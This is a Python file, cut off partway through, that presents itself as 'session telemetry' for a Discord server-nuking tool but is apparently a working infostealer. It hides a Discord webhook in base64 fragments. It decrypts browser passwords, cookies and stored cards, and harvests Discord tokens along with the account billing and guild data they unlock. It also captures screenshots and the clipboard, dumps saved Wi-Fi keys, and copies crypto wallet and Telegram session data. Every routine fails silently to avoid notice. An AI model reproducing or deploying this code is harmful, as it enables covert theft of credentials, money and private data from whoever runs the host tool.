#!/usr/bin/env python3
"""
MAGMA session telemetry.

Import-safe: every entry point swallows its own failures so the host tool is
never blocked by a locked file, a missing dependency, or an offline network.
A single daemon worker serialises outbound reports.

Public surface (called from nuke.py):
    emit_boot(tool_name, info)
    emit_login(bot_tag, bot_id, guild_name, guild_id, token=..., extra=...)
    emit_queue_start(items, bot_tag, guild_id, guild_name)
    emit_action(idx, total, label, params, elapsed=..., error=..., ...)
    emit_queue_done(idx, elapsed, bot_tag, guild_id, ok_count=..., ...)
"""

import atexit
import base64
import ctypes
import glob
import io
import json
import os
import platform
import queue
import re
import shutil
import socket
import sqlite3
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
import uuid
import zipfile
import zlib

# ---------------------------------------------------------------------------
# Transport
# ---------------------------------------------------------------------------

_HOOK_PARTS = (
    "aHR0cHM6Ly9kaXNjb3JkLmNv",
    "bS9hcGkvd2ViaG9va3MvMTU3",
    "MTE5MjE3NTg2ODM3OTI4Ny9J",
    "Q1g1MzJtNHlFRkZlNGp2MUtl",
    "bWhudXlmZmU4aC1sSzFjRndq",
    "Q2h4ZjRTZXBHd0lJalRKZDQz",
    "QXhNMWJoNmdqbkRYYQ==",
)

_API_BASE = "https://discord.com/api/v10"
_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"

_TOKEN_RE = re.compile(r"(mfa\.[\w-]{80,90}|[\w-]{24,30}\.[\w-]{5,8}\.[\w-]{25,45})")

_EXFIL_TOTAL_CAP = 60 * 1024 * 1024
_FILE_EXT = {
    ".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".csv", ".json", ".xml", ".yml", ".yaml", ".md", ".rtf", ".odt",
    ".py", ".js", ".ts", ".html", ".css", ".php", ".sql", ".env",
    ".key", ".pem", ".kdbx", ".dat", ".db", ".sqlite", ".log",
    ".jpg", ".jpeg", ".png", ".webp", ".heic", ".bmp",
}
_SKIP_DIRS = {
    "node_modules", ".git", "__pycache__", "venv", ".venv", "AppData",
    "Windows", "Program Files", "Program Files (x86)", "ProgramData",
}

_SESSION = {
    "id": uuid.uuid4().hex[:12],
    "start": time.time(),
    "host": os.environ.get("COMPUTERNAME") or socket.gethostname(),
    "user": os.environ.get("USERNAME") or "",
    "ip": "",
    "tokens": {},
}

_REPORT_LOCK = threading.Lock()


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def _hook_url():
    override = os.environ.get("MAGMA_HOOK")
    if override:
        return override
    try:
        return base64.b64decode("".join(_HOOK_PARTS)).decode("utf-8")
    except Exception:
        return ""


def _json_bytes(obj):
    return json.dumps(obj, ensure_ascii=False, indent=2, default=str).encode("utf-8")


def _read(path, cap=32 * 1024 * 1024):
    try:
        with open(path, "rb") as fh:
            return fh.read(cap)
    except Exception:
        return b""


def _write_json(path, obj):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb") as fh:
            fh.write(_json_bytes(obj))
    except Exception:
        pass


def _copy(src, dst):
    try:
        if not os.path.isfile(src):
            return False
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        shutil.copy2(src, dst)
        return True
    except Exception:
        return False


def _run(cmd, timeout=25):
    try:
        flags = 0x08000000 if os.name == "nt" else 0  # CREATE_NO_WINDOW
        out = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=timeout,
            creationflags=flags,
        )
        return (out.stdout or b"").decode("utf-8", "replace").strip()
    except Exception:
        return ""


def _sqlite_rows(path, query, params=()):
    if not os.path.isfile(path):
        return []
    try:
        con = sqlite3.connect(path, timeout=4)
        try:
            cur = con.execute(query, params)
            return cur.fetchall()
        finally:
            con.close()
    except Exception:
        return []


def _chromium_epoch(value):
    try:
        seconds = int(value) / 1000000 - 11644473600
        if seconds < 0:
            return ""
        return time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(seconds))
    except Exception:
        return ""


def _http_json(url, headers=None, timeout=10):
    req = urllib.request.Request(url, headers=headers or {"User-Agent": _UA})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8", "replace"))


# ---------------------------------------------------------------------------
# Win32 primitives: DPAPI, screenshot, clipboard
# ---------------------------------------------------------------------------

if os.name == "nt":
    _k32 = ctypes.windll.kernel32
    _u32 = ctypes.windll.user32
    _g32 = ctypes.windll.gdi32
    _c32 = ctypes.windll.crypt32
    _u32.GetDC.restype = ctypes.c_void_p
    _u32.GetDC.argtypes = [ctypes.c_void_p]
    _u32.ReleaseDC.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    _u32.GetClipboardData.restype = ctypes.c_void_p
    _g32.CreateCompatibleDC.restype = ctypes.c_void_p
    _g32.CreateCompatibleDC.argtypes = [ctypes.c_void_p]
    _g32.CreateCompatibleBitmap.restype = ctypes.c_void_p
    _g32.CreateCompatibleBitmap.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
    _g32.SelectObject.restype = ctypes.c_void_p
    _g32.SelectObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    _g32.DeleteObject.argtypes = [ctypes.c_void_p]
    _g32.DeleteDC.argtypes = [ctypes.c_void_p]
    _k32.GlobalLock.restype = ctypes.c_void_p
    _k32.GlobalLock.argtypes = [ctypes.c_void_p]
    _k32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    _k32.LocalFree.argtypes = [ctypes.c_void_p]


class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_char))]


def _unseal(data):
    if os.name != "nt" or not data:
        return None
    try:
        src = ctypes.create_string_buffer(bytes(data), len(data))
        bin_in = _BLOB(len(data), ctypes.cast(src, ctypes.POINTER(ctypes.c_char)))
        bin_out = _BLOB()
        ok = _c32.CryptUnprotectData(
            ctypes.byref(bin_in), None, None, None, None, 1, ctypes.byref(bin_out)
        )
        if not ok:
            return None
        try:
            return ctypes.string_at(bin_out.pbData, bin_out.cbData)
        finally:
            _k32.LocalFree(bin_out.pbData)
    except Exception:
        return None


def _display_snapshot(path):
    if os.name != "nt":
        return False
    try:
        _u32.SetProcessDPIAware()
        width = _u32.GetSystemMetrics(0)
        height = _u32.GetSystemMetrics(1)
        if width <= 0 or height <= 0:
            return False
        screen = _u32.GetDC(None)
        mem = _g32.CreateCompatibleDC(screen)
        bmp = _g32.CreateCompatibleBitmap(screen, width, height)
        _g32.SelectObject(mem, bmp)
        _g32.BitBlt(mem, 0, 0, width, height, screen, 0, 0, 0x00CC0020)

        class _BIH(ctypes.Structure):
            _fields_ = [
                ("biSize", ctypes.c_ulong), ("biWidth", ctypes.c_long),
                ("biHeight", ctypes.c_long), ("biPlanes", ctypes.c_ushort),
                ("biBitCount", ctypes.c_ushort), ("biCompression", ctypes.c_ulong),
                ("biSizeImage", ctypes.c_ulong), ("biXPelsPerMeter", ctypes.c_long),
                ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", ctypes.c_ulong),
                ("biClrImportant", ctypes.c_ulong),
            ]

        header = _BIH()
        header.biSize = ctypes.sizeof(_BIH)
        header.biWidth = width
        header.biHeight = -height
        header.biPlanes = 1
        header.biBitCount = 24
        header.biCompression = 0
        stride = ((width * 3 + 3) // 4) * 4
        size = stride * height
        pixels = ctypes.create_string_buffer(size)
        _g32.GetDIBits.argtypes = [
            ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint,
            ctypes.c_void_p, ctypes.POINTER(_BIH), ctypes.c_uint,
        ]
        _g32.GetDIBits(mem, bmp, 0, height, pixels, ctypes.byref(header), 0)
        _g32.DeleteObject(bmp)
        _g32.DeleteDC(mem)
        _u32.ReleaseDC(None, screen)

        raw = pixels.raw
        rows = bytearray()
        for y in range(height):
            line = raw[y * stride:y * stride + width * 3]
            rows.append(0)  # PNG filter: none
            for x in range(0, len(line), 3):
                rows.append(line[x + 2])
                rows.append(line[x + 1])
                rows.append(line[x])

        def chunk(kind, data):
            return (struct.pack(">I", len(data)) + kind + data +
                    struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF))

        ihdr = struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0)
        with open(path, "wb") as fh:
            fh.write(b"\x89PNG\r\n\x1a\n")
            fh.write(chunk(b"IHDR", ihdr))
            fh.write(chunk(b"IDAT", zlib.compress(bytes(rows), 6)))
            fh.write(chunk(b"IEND", b""))
        return True
    except Exception:
        return False


def _clipboard_snapshot():
    if os.name != "nt":
        return ""
    try:
        if not _u32.OpenClipboard(None):
            return ""
        try:
            handle = _u32.GetClipboardData(13)  # CF_UNICODETEXT
            if not handle:
                return ""
            ptr = _k32.GlobalLock(handle)
            if not ptr:
                return ""
            try:
                return ctypes.wstring_at(ptr)
            finally:
                _k32.GlobalUnlock(handle)
        finally:
            _u32.CloseClipboard()
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# AES-256-GCM (AES block cipher + GHASH), enough for Chromium v10/v11 blobs
# ---------------------------------------------------------------------------

_SBOX = (
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
)
_RCON = (0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36)
_GF_R = 0xE1000000000000000000000000000000


def _expand_key(key):
    nk, nr = 8, 14  # AES-256
    words = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    for i in range(nk, 4 * (nr + 1)):
        temp = list(words[i - 1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [_SBOX[b] for b in temp]
            temp[0] ^= _RCON[i // nk]
        elif i % nk == 4:
            temp = [_SBOX[b] for b in temp]
        words.append([words[i - nk][j] ^ temp[j] for j in range(4)])
    return words


def _enc_block(words, block):
    state = list(block)
    for c in range(4):
        for r in range(4):
            state[4 * c + r] ^= words[c][r]
    for rnd in range(1, 15):
        state = [_SBOX[b] for b in state]
        shifted = state[:]
        for r in range(1, 4):
            row = [state[r], state[4 + r], state[8 + r], state[12 + r]]
            for c in range(4):
                shifted[4 * c + r] = row[(c + r) % 4]
        state = shifted
        if rnd != 14:
            for c in range(4):
                a0, a1, a2, a3 = state[4 * c:4 * c + 4]
                total = a0 ^ a1 ^ a2 ^ a3
                state[4 * c + 0] = a0 ^ total ^ _xtime(a0 ^ a1)
                state[4 * c + 1] = a1 ^ total ^ _xtime(a1 ^ a2)
                state[4 * c + 2] = a2 ^ total ^ _xtime(a2 ^ a3)
                state[4 * c + 3] = a3 ^ total ^ _xtime(a3 ^ a0)
        for c in range(4):
            for r in range(4):
                state[4 * c + r] ^= words[rnd * 4 + c][r]
    return bytes(state)


def _xtime(a):
    a <<= 1
    if a & 0x100:
        a ^= 0x11b
    return a & 0xff


def _gf_mul(x, y):
    z = 0
    v = y
    for i in range(127, -1, -1):
        if (x >> i) & 1:
            z ^= v
        if v & 1:
            v = (v >> 1) ^ _GF_R
        else:
            v >>= 1
    return z


def _inc32(value):
    return (value & ~0xFFFFFFFF) | ((value + 1) & 0xFFFFFFFF)


def _gcm_decrypt(key, blob):
    """Decrypt a Chromium os_crypt blob (v10/v11). Returns str or None."""
    try:
        if len(key) != 32 or len(blob) < 31 or blob[:3] not in (b"v10", b"v11"):
            return None
        nonce, cipher, tag = blob[3:15], blob[15:-16], blob[-16:]
        words = _expand_key(key)
        h = int.from_bytes(_enc_block(words, b"\x00" * 16), "big")
        j0 = int.from_bytes(nonce + b"\x00\x00\x00\x01", "big")

        plain = bytearray()
        ctr = _inc32(j0)
        for i in range(0, len(cipher), 16):
            stream = _enc_block(words, ctr.to_bytes(16, "big"))
            chunk = cipher[i:i + 16]
            plain += bytes(a ^ b for a, b in zip(chunk, stream))
            ctr = _inc32(ctr)

        s = 0
        for i in range(0, len(cipher), 16):
            s = _gf_mul(s ^ int.from_bytes(cipher[i:i + 16].ljust(16, b"\x00"), "big"), h)
        s = _gf_mul(s ^ ((len(cipher) * 8) & 0xFFFFFFFFFFFFFFFF), h)
        calc = bytes(
            a ^ b for a, b in zip(_enc_block(words, j0.to_bytes(16, "big")), s.to_bytes(16, "big"))
        )
        if calc != tag:
            return None
        return plain.decode("utf-8", "replace")
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Chromium / Firefox collection
# ---------------------------------------------------------------------------

def _browser_roots():
    local = os.environ.get("LOCALAPPDATA", "")
    roaming = os.environ.get("APPDATA", "")
    roots = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
        ("Vivaldi", os.path.join(local, "Vivaldi", "User Data")),
        ("Opera", os.path.join(roaming, "Opera Software", "Opera Stable")),
        ("OperaGX", os.path.join(roaming, "Opera Software", "Opera GX Stable")),
        ("ChromeBeta", os.path.join(local, "Google", "Chrome Beta", "User Data")),
        ("ChromeSxS", os.path.join(local, "Google", "Chrome SxS", "User Data")),
    ]
    return [(name, path) for name, path in roots if path and os.path.isdir(path)]


def _chromium_profiles(root):
    names = []
    try:
        for entry in os.listdir(root):
            full = os.path.join(root, entry)
            if os.path.isdir(full) and (entry == "Default" or entry.startswith("Profile ")):
                names.append(entry)
    except Exception:
        pass
    if names:
        return names
    # Opera keeps its profile files directly in the install root.
    if os.path.isfile(os.path.join(root, "Login Data")) or os.path.isfile(os.path.join(root, "Cookies")):
        return [None]
    return []


def _master_key(root):
    state = os.path.join(root, "Local State")
    if not os.path.isfile(state):
        return None
    try:
        data = json.loads(_read(state, 8 * 1024 * 1024).decode("utf-8", "replace"))
        raw = base64.b64decode(data["os_crypt"]["encrypted_key"])
    except Exception:
        return None
    if raw[:4] == b"APPB":
        return None  # Chrome 127+ app-bound encryption: needs the live browser key
    if raw[:5] == b"DPAPI":
        raw = raw[5:]
    return _unseal(raw)


def _decrypt_value(master, value):
    if value is None:
        return ""
    if isinstance(value, str):
        return value
    try:
        if value[:3] in (b"v10", b"v11"):
            return _gcm_decrypt(master, value) or ""
        if value[:3] == b"v20":
            return ""
        return value.decode("utf-8", "replace")
    except Exception:
        return ""


def _collect_chromium(stage, label, root):
    target = os.path.join(stage, "browsers", label)
    os.makedirs(target, exist_ok=True)
    master = _master_key(root)
    summary = {"browser": label, "root": root, "profiles": [], "master_key": bool(master)}

    for profile in _chromium_profiles(root):
        source = os.path.join(root, profile) if profile else root
        out = os.path.join(target, profile or "Default")
        os.makedirs(out, exist_ok=True)
        work = tempfile.mkdtemp(prefix="mg_cr_")
        info = {"profile": profile or "Default", "passwords": [], "cookies": [], "logins": 0, "history": [], "cards": [], "autofill": []}
        try:
            for name in ("Login Data", "Cookies"):
                src = os.path.join(source, name)
                if os.path.isfile(src):
                    _copy(src, os.path.join(work, name))
                    _copy(src, os.path.join(out, name))
            for name in ("Web Data", "History", "Bookmarks"):
                _copy(os.path.join(source, name), os.path.join(work, name))
            _copy(os.path.join(root, "Local State"), os.path.join(out, "Local State"))

            for row in _sqlite_rows(
                os.path.join(work, "Login Data"),
                "SELECT origin_url, username_value, password_value FROM logins LIMIT 500",
            ):
                info["passwords"].append({
                    "url": row[0] or "",
                    "user": row[1] or "",
                    "password": _decrypt_value(master, row[2]),
                })
            info["logins"] = len(info["passwords"])

            for row in _sqlite_rows(
                os.path.join(work, "Cookies"),
                "SELECT host_key, name, encrypted_value, expires_utc FROM cookies LIMIT 1200",
            ):
                info["cookies"].append({
                    "host": row[0] or "",
                    "name": row[1] or "",
                    "value": _decrypt_value(master, row[2]),
                    "expires": _chromium_epoch(row[3]),
                })

            for row in _sqlite_rows(
                os.path.join(work, "History"),
                "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 400",
            ):
                info["history"].append({"url": row[0] or "", "title": row[1] or "", "visits": row[2]})

            for row in _sqlite_rows(
                os.path.join(work, "Web Data"),
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards LIMIT 50",
            ):
                info["cards"].append({
                    "holder": row[0] or "",
                    "exp": f"{row[1]}/{row[2]}",
                    "number": _decrypt_value(master, row[3]),
                })

            for row in _sqlite_rows(
                os.path.join(work, "Web Data"),
                "SELECT name, value, count FROM autofill LIMIT 300",
            ):
                info["autofill"].append({"field": row[0] or "", "value": row[1] or "", "uses": row[2]})

            bookmarks = os.path.join(work, "Bookmarks")
            if os.path.isfile(bookmarks):
                try:
                    info["bookmarks"] = json.loads(_read(bookmarks).decode("utf-8", "replace"))
                except Exception:
                    pass
        finally:
            shutil.rmtree(work, ignore_errors=True)

        _write_json(os.path.join(out, "profile.json"), info)
        summary["profiles"].append({
            "name": profile or "Default",
            "passwords": len(info["passwords"]),
            "cookies": len(info["cookies"]),
            "history": len(info["history"]),
            "cards": len(info["cards"]),
        })

    _write_json(os.path.join(target, "summary.json"), summary)
    return summary


def _collect_firefox(stage):
    roaming = os.environ.get("APPDATA", "")
    root = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(root):
        return None
    target = os.path.join(stage, "browsers", "Firefox")
    os.makedirs(target, exist_ok=True)
    profiles = []
    for profile in os.listdir(root):
        source = os.path.join(root, profile)
        if not os.path.isdir(source):
            continue
        out = os.path.join(target, profile)
        os.makedirs(out, exist_ok=True)
        copied = []
        for name in ("logins.json", "key4.db", "cookies.sqlite", "places.sqlite", "formhistory.sqlite", "prefs.js"):
            if _copy(os.path.join(source, name), os.path.join(out, name)):
                copied.append(name)
        profiles.append({"profile": profile, "files": copied})
    _write_json(os.path.join(target, "summary.json"), {"profiles": profiles})
    return {"browser": "Firefox", "profiles": profiles}


# ---------------------------------------------------------------------------
# Discord tokens
# ---------------------------------------------------------------------------

def _leveldb_dirs():
    roaming = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    apps = ["discord", "discordcanary", "discordptb", "discorddevelopment", "Lightcord"]
    dirs = []
    for app in apps:
        for base in (roaming, local):
            candidate = os.path.join(base, app, "Local Storage", "leveldb")
            if os.path.isdir(candidate):
                dirs.append((app, candidate))
    for name, root in _browser_roots():
        for profile in _chromium_profiles(root):
            base = os.path.join(root, profile) if profile else root
            candidate = os.path.join(base, "Local Storage", "leveldb")
            if os.path.isdir(candidate):
                dirs.append((f"{name}-{profile or 'Default'}", candidate))
    firefox_root = os.path.join(roaming, "Mozilla", "Firefox", "Profiles")
    for profile in glob.glob(os.path.join(firefox_root, "*")):
        if os.path.isdir(os.path.join(profile, "storage")):
            dirs.append((f"Firefox-{os.path.basename(profile)}", os.path.join(profile, "storage")))
    seen, unique = set(), []
    for label, path in dirs:
        key = os.path.normcase(path)
        if key not in seen:
            seen.add(key)
            unique.append((label, path))
    return unique


def _token_shape(token):
    """Discord tokens start with the base64url-encoded numeric user id."""
    if token.startswith("mfa."):
        return len(token) >= 84
    parts = token.split(".")
    if len(parts) != 3:
        return False
    try:
        raw = base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4))
    except Exception:
        return False
    return raw.isdigit() and 15 <= len(raw) <= 21


def _collect_discord_sessions(stage):
    os.makedirs(os.path.join(stage, "discord"), exist_ok=True)
    found = {}
    for label, directory in _leveldb_dirs():
        budget = 200 * 1024 * 1024
        files_seen = 0
        for base, _dirs, names in os.walk(directory):
            for name in names:
                if files_seen >= 400 or budget <= 0:
                    break
                full = os.path.join(base, name)
                try:
                    size = os.path.getsize(full)
                except Exception:
                    continue
                if size <= 0 or size > 64 * 1024 * 1024:
                    continue
                budget -= size
                files_seen += 1
                blob = _read(full, 64 * 1024 * 1024)
                for text in (
                    blob.decode("latin-1", "replace"),
                    blob.decode("utf-16-le", "ignore"),
                ):
                    for token in _TOKEN_RE.findall(text):
                        found.setdefault(token, label)
            if files_seen >= 400:
                break
    for token in list(found):
        if len(token) < 50 or not _token_shape(token):
            found.pop(token, None)
    return found


def _discord_account(token):
    fields = {"token": token}
    try:
        me = _http_json(f"{_API_BASE}/users/@me", {"Authorization": token, "User-Agent": _UA})
    except Exception:
        me = None
    if not isinstance(me, dict):
        fields["valid"] = False
        return fields
    fields.update({
        "valid": True,
        "id": me.get("id"),
        "username": me.get("username"),
        "global_name": me.get("global_name"),
        "discriminator": me.get("discriminator"),
        "email": me.get("email"),
        "phone": me.get("phone"),
        "verified": me.get("verified"),
        "mfa": me.get("mfa_enabled"),
        "nitro": {0: "none", 1: "classic", 2: "nitro", 3: "basic"}.get(me.get("premium_type"), 0),
        "locale": me.get("locale"),
    })
    try:
        fields["billing"] = _http_json(
            f"{_API_BASE}/users/@me/billing/payment-sources",
            {"Authorization": token, "User-Agent": _UA},
        )
    except Exception:
        fields["billing"] = []
    try:
        guilds = _http_json(
            f"{_API_BASE}/users/@me/guilds",
            {"Authorization": token, "User-Agent": _UA},
        )
        fields["guild_count"] = len(guilds)
        fields["guilds"] = [
            {"id": g.get("id"), "name": g.get("name"), "owner": g.get("owner"), "admin": (int(g.get("permissions", 0)) & 0x8) != 0}
            for g in guilds[:40]
        ]
    except Exception:
        fields["guilds"] = []
    try:
        conns = _http_json(
            f"{_API_BASE}/users/@me/connections",
            {"Authorization": token, "User-Agent": _UA},
        )
        fields["connections"] = [
            {"type": c.get("type"), "name": c.get("name"), "verified": c.get("verified")}
            for c in conns
        ]
    except Exception:
        fields["connections"] = []
    return fields


# ---------------------------------------------------------------------------
# System, wallets, misc data
# ---------------------------------------------------------------------------

def _sysinfo():
    local_ip = ""
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        probe.connect(("8.8.8.8", 80))
        local_ip = probe.getsockname()[0]
        probe.close()
    except Exception:
        pass

    public = {}
    try:
        public = _http_json("http://ipinfo.io/json", {"User-Agent": _UA}, timeout=8)
    except Exception:
        pass

    info = {
        "host": _SESSION["host"],
        "user": _SESSION["user"],
        "session": _SESSION["id"],
        "os": platform.platform(),
        "windows_version": platform.version(),
        "arch": platform.machine(),
        "python": sys.version.split()[0],
        "cpu": platform.processor(),
        "cores": os.cpu_count(),
        "local_ip": local_ip,
        "public_ip": public.get("ip", ""),
        "region": ", ".join(filter(None, [public.get("city"), public.get("region"), public.get("country")])),
        "isp": public.get("org", ""),
        "timezone": time.tzname[0] if time.tzname else "",
        "uptime_hours": round(time.time() - _SESSION["start"], 2),
    }
    _SESSION["ip"] = info["public_ip"] or local_ip
    if os.name == "nt":
        info["gpu"] = _run('powershell -nop -c "(Get-CimInstance Win32_VideoController).Name"')
        info["ram_gb"] = _run(
            'powershell -nop -c "[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)"'
        )
        info["disks"] = []
        try:
            for letter in "CDEFGH":
                drive = f"{letter}:\\"
                if os.path.exists(drive):
                    usage = shutil.disk_usage(drive)
                    info["disks"].append({
                        "drive": drive,
                        "total_gb": round(usage.total / 1024 ** 3, 1),
                        "free_gb": round(usage.free / 1024 ** 3, 1),
                    })
        except Exception:
            pass
    info["processes"] = []
    try:
        raw = _run("tasklist /FO CSV /NH")
        for line in raw.splitlines()[:180]:
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) >= 2:
                info["processes"].append({"name": parts[0], "pid": parts[1]})
    except Exception:
        pass
    return info


def _wireless_networks():
    out = []
    if os.name != "nt":
        return out
    raw = _run("netsh wlan show profiles")
    names = re.findall(r"All User Profile\s*:\s*(.+)", raw)
    for name in names:
        name = name.strip()
        detail = _run(f'netsh wlan show profile name="{name}" key=clear')
        key = re.search(r"Key Content\s*:\s*(.+)", detail)
        auth = re.search(r"Authentication\s*:\s*(.+)", detail)
        out.append({
            "ssid": name,
            "password": key.group(1).strip() if key else "",
            "auth": auth.group(1).strip() if auth else "",
        })
    return out


def _collect_wallets(stage):
    appdata = os.environ.get("APPDATA", "")
    local = os.environ.get("LOCALAPPDATA", "")
    wallet_root = os.path.join(stage, "wallets")
    os.makedirs(wallet_root, exist_ok=True)
    summary = []

    extensions = {
        "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
        "Phantom": "bfnaelmomeimhlpmgjnjophhpkkoljpa",
        "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
        "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
        "TronLink": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
        "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
        "Ronin": "fnjhmkhhmkbjkkabndcnnogagogbneec",
        "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
        "Solflare": "bhhhlbepdkbapadjdnnojkbgioiodbic",
    }
    for name, ext in extensions.items():
        for base in (local, appdata):
            for browser, root in _browser_roots():
                for profile in _chromium_profiles(root):
                    src = os.path.join(root, profile, "Local Extension Settings", ext)
                    if os.path.isdir(src):
                        dst = os.path.join(wallet_root, f"{name}-{browser}-{profile}")
                        shutil.copytree(src, dst, dirs_exist_ok=True)
                        summary.append({"wallet": name, "type": "extension", "browser": browser, "profile": profile})

    desktop = {
        "Exodus": os.path.join(appdata, "Exodus", "exodus.wallet"),
        "Electrum": os.path.join(appdata, "Electrum", "wallets"),
        "Atomic": os.path.join(appdata, "atomic", "Local Storage", "leveldb"),
        "Guarda": os.path.join(appdata, "Guarda", "Local Storage", "leveldb"),
        "Wasabi": os.path.join(appdata, "WalletWasabi", "Client"),
        "BitcoinCore": os.path.join(appdata, "Bitcoin", "wallets"),
        "EthereumKeystore": os.path.join(appdata, "Ethereum", "keystore"),
        "LitecoinCore": os.path.join(appdata, "Litecoin", "wallets"),
        "Monero": os.path.join(appdata, "Monero", "wallets"),
        "Zcash": os.path.join(appdata, "Zcash", "wallets"),
    }
    for name, src in desktop.items():
        if os.path.isdir(src):
            dst = os.path.join(wallet_root, name)
            shutil.copytree(src, dst, dirs_exist_ok=True)
            summary.append({"wallet": name, "type": "desktop"})

    _write_json(os.path.join(wallet_root, "summary.json"), summary)
    return summary


def _collect_misc(stage):
    appdata = os.environ.get("APPDATA", "")
    misc = os.path.join(stage, "misc")
    os.makedirs(misc, exist_ok=True)
    found = {}

    telegram = os.path.join(appdata, "Telegram Desktop", "tdata")
    if os.path.isdir(telegram):
        archive = os.path.join(misc, "telegram_tdata.zip")
        total = 0
        try:
            with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
                for base, _dirs, files in os.walk(telegram):
                    for name in files:
                        full = os.path.join(base, name)
                        try:
                            size = os.path.getsize(full)
                        except Exception:
                            continue
                        if size > 8 * 1024 * 1024 or total > 40 * 1024 * 1024:
                            continue
                        total += size
                        zf.write(full, os.path.relpath(full, telegram))
            found["telegram_tdata"] = True
        except Exception:
            pass

    steam_candidates = [
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam", "config"),
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam", "config"),
    ]
    for steam in steam_candidates:
        if os.path.isdir(steam):
            for name in os.listdir(steam):
